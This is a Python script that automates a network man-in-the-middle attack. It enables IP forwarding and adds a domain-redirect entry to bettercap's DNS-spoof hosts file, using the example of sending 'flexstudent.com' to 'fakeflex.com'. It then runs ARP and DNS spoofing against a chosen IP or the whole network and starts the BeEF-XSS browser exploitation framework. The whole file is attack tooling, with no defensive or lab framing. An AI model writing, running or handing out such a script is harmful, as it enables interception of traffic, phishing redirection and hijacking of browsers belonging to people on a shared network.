import os
import subprocess
import time


def run_command(command, silent=False):
    """Run a shell command and handle errors."""
    try:
        if not silent:
            print(f"Running: {command}")
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        if not silent:
            print(output)
        return output
    except subprocess.CalledProcessError as e:
        print(f"Error: {e.output}")
        return None


def ensure_permissions(file_path):
    """Ensure a file is writable by the script."""
    print(f"Checking permissions for {file_path}...")
    if not os.access(file_path, os.W_OK):
        print(f"Setting write permissions for {file_path}...")
        run_command(f"sudo chmod o+w {file_path}")
        print(f"Permissions updated for {file_path}.")
    else:
        print(f"Permissions are already set for {file_path}.")


def configure_dns_spoof(target_domain, redirect_domain, dns_spoof_file):
    """Configure DNS spoofing."""
    print("\nConfiguring DNS spoofing...")
    dns_entry = f"{target_domain} {redirect_domain}"
    ensure_permissions(dns_spoof_file)
    try:
        with open(dns_spoof_file, "a") as file:
            file.write(f"\n{dns_entry}\n")
        print(f"Added DNS entry to {dns_spoof_file}: {dns_entry}")
    except PermissionError:
        print("Error: Failed to write to the DNS spoofing hosts file. Check permissions!")


def start_beef():
    """Start BeEF-XSS framework."""
    print("\nStarting BeEF-XSS framework...")
    beef_process = subprocess.Popen(["sudo", "beef-xss"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(10)  # Give BeEF some time to initialize
    print("BeEF-XSS should now be running. Access it via http://127.0.0.1:3000/ui/panel")
    return beef_process


def cleanup():
    """Reset all settings to defaults."""
    print("\nReverting settings to defaults...")
    run_command("echo 'arp.spoof off' | sudo bettercap -eval")
    run_command("echo 'dns.spoof off' | sudo bettercap -eval")
    run_command("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")
    print("Cleanup complete.")


def main():
    dns_spoof_file = "/usr/share/bettercap/caplets/dns.spoof.hosts"
    try:
        # Enable IP forwarding
        print("Enabling IP forwarding...")
        run_command("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")

        # Input network interface and domains
        network_interface = input("Enter the network interface (e.g., eth0, wlan0): ").strip()
        target_domain = input("Enter the domain you want to spoof (e.g., flexstudent.com): ").strip()
        redirect_domain = input("Enter the redirect domain (e.g., fakeflex.com): ").strip()

        # Configure DNS spoofing
        configure_dns_spoof(target_domain, redirect_domain, dns_spoof_file)

        # Configure ARP spoofing
        target_ip = input("Enter target IP (or leave blank for entire network): ").strip()
        if target_ip:
            run_command(f"echo 'set arp.spoof.targets {target_ip}' | sudo bettercap -eval")
        run_command("echo 'arp.spoof on' | sudo bettercap -eval")
        run_command("echo 'dns.spoof on' | sudo bettercap -eval")

        # Start Bettercap
        bettercap_command = f"sudo bettercap -iface {network_interface}"
        print("\nStarting Bettercap...")
        bettercap_process = subprocess.Popen(bettercap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Start BeEF-XSS
        beef_process = start_beef()

        print("\nAll configurations applied. Press Ctrl+C to terminate and clean up.")
        bettercap_process.wait()

    except KeyboardInterrupt:
        print("\nTerminating...")

    finally:
        cleanup()


if __name__ == "__main__":
    main()
